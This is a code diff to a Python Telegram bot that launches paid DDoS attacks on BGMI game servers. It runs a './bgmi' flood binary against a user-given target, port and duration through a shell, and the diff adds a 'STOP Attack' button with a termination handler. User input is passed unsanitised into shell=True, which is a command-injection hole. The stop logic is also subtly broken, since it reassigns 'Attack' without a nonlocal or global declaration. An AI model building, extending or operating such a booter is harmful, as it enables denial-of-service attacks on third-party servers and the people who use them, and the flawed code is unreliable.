@@ -1,4 +1,5 @@
 import telebot
+from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 import subprocess
 from datetime import datetime, timedelta
 import time
@@ -12,6 +13,8 @@ import tempfile
 DB_FILE = 'bot_data.db'
 keep_alive()
 initialize_db()
+
+Attack = None
 
 def db_connection():
     conn = sqlite3.connect(DB_FILE)
@@ -406,8 +409,10 @@ def initialize_bot(bot, bot_id):
     def start_attack_reply(message, target, port, time):
         user_info = message.from_user
         username = user_info.username if user_info.username else user_info.first_name
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("STOP Attack", callback_data="stop_attack"))
         response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
-        bot.reply_to(message, response)
+        bot.reply_to(message, response, reply_markup=markup)
     
     bgmi_cooldown = {}
     COOLDOWN_TIME =0
@@ -438,14 +443,7 @@ def initialize_bot(bot, bot_id):
                     log_command(user_id, target, port, time, '/bgmi')
                     start_attack_reply(message, target, port, time)  
                     full_command = f"./bgmi {target} {port} {time} 900"
-                    # subprocess.run(full_command, shell=True)
-                    # response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {time} Seconds\n\n👛Dm to Buy : {owner_name}"
-            # else:
-                # response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
-        # else:
-            # response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
-        # bot.reply_to(message, response)
-                    subprocess.Popen(full_command, shell=True)
+                    Attack = subprocess.Popen(full_command, shell=True)
                     scheduled_time = datetime.now() + timedelta(seconds=time)
                     Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
             else:
@@ -461,6 +459,16 @@ def initialize_bot(bot, bot_id):
         
         response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
         bot.reply_to(message, response)
+    
+    @bot.callback_query_handler(func=lambda call: True)
+    def handle_callback_query(call):
+        if call.data == "stop_attack":
+            if Attack is not None:
+                Attack.terminate()
+                bot.answer_callback_query(call.id, "Attack stopped successfully.")
+                Attack = None
+            else:
+                bot.answer_callback_query(call.id, "No running attacks to be stopped.")
     
     @bot.message_handler(commands=['help'])
     def show_help(message):
